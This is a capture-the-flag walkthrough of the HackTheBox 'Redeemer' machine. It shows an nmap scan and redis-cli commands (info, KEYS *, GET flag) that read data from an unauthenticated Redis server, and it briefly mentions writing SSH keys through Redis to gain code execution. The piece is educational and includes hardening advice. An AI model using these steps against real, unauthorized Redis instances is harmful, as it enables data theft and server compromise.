// 01

Summary

Redeemer is the fourth machine of HackTheBox Starting Point Tier 0. It introduces Redis — an in-memory key-value data store — and demonstrates the consequences of exposing it on a public network without authentication.

Redis listens on port 6379 by default and, unless explicitly configured with a password (requirepass) or bound to localhost (bind 127.0.0.1), accepts connections from any host. An attacker with network access can connect directly, enumerate all keys, and read the data without any credentials.

The attack chain: scan for the non-standard port with -p-, connect with redis-cli, run info to confirm open access, use KEYS * to list all keys, and GET flag to retrieve the flag value.

# Vulnerability Technique Impact
1 Redis with no authentication redis-cli direct connection + key dump Full read access to all stored data

// Key takeaway

Redis must never be exposed to untrusted networks. Always bind it to 127.0.0.1 and set a strong password with requirepass. In cloud environments, Redis instances are commonly left publicly accessible — this is consistently one of the most exploited misconfigurations in real-world breaches.

// 02

Reconnaissance

1
Full port scan — Redis is not on a common port

Redis runs on port 6379, which is not in Nmap's default top-1000 ports. We must use -p- to scan all 65535 ports to find it. This is slower but ensures we don't miss services running on non-standard ports.

RECON
$ nmap -sV -p- 10.129.x.x
PORT STATE SERVICE VERSION
6379/tcp open redis Redis key-value store 5.0.7

Port 6379/tcp is open, running Redis 5.0.7. Only this single service is exposed — the entire attack surface is the Redis daemon.

// 03

Exploitation

1
Connect to Redis

We use redis-cli with the -h flag to specify the remote host. If no authentication is configured, we are immediately connected to an interactive Redis prompt.

CONNECT
$ redis-cli -h 10.129.x.x
10.129.x.x:6379>
2
Enumerate server info

The info command returns server metadata — version, memory usage, number of databases, and crucially whether authentication is required. No error means we are in.

10.129.x.x:6379> info
# Server
redis_version:5.0.7
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0

The Keyspace section reveals db0 contains 4 keys. We can now dump all of them.

3
List all keys and retrieve the flag
10.129.x.x:6379> KEYS *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
10.129.x.x:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"

// 04

Flag

// Machine Pwned ✓

Flag retrieved directly from an unauthenticated Redis instance. The KEYS * + GET workflow dumps any data stored in the database in seconds.

// Real-world impact

In real breaches, attackers don't stop at reading data. An unauthenticated Redis instance can also be used to write SSH keys to the server's authorized_keys file (if Redis runs as root and the data directory is set to /root/.ssh/), achieving remote code execution. This technique has been used in numerous cryptomining and ransomware campaigns targeting cloud instances.

// 05

Tool Reference

redis-cli
redis-cli -h <host> [-p port] [-a pass]
Official Redis command-line client for interacting with a Redis server.
  • -h — remote host
  • -p — port (default 6379)
  • -a — authenticate with password
  • info — server information
  • KEYS * — list all keys
  • GET <key> — retrieve a value
  • SELECT <db> — switch database (0–15)
nmap -p-
nmap -p- -sV <target>
Scans all 65535 TCP ports — essential when services run on non-standard ports like Redis (6379).
  • -p- — all ports
  • -p 6379 — target Redis specifically
  • --min-rate 5000 — speed up scan

// 06

Glossary

Redis (REmote DIctionary Server)
Redis is an open-source, in-memory data structure store used as a database, cache, and message broker. It stores data as key-value pairs and supports strings, hashes, lists, sets, and more. Because it is designed for high-performance in-memory operations, it is extremely fast but has historically defaulted to no authentication — relying on network-level controls (firewall, bind 127.0.0.1) to prevent unauthorized access. Redis 6.0+ introduced ACLs (Access Control Lists) for more granular security.
In-Memory Database Exposure
In-memory databases like Redis and Memcached are frequently misconfigured with public internet exposure. Shodan scans consistently find hundreds of thousands of unauthenticated Redis instances worldwide. The impact ranges from data theft to full server compromise (via the SSH key write technique). Proper deployment always means: bind to 127.0.0.1, enable requirepass, use a firewall to block port 6379 from the public internet, and run Redis as a non-root user.
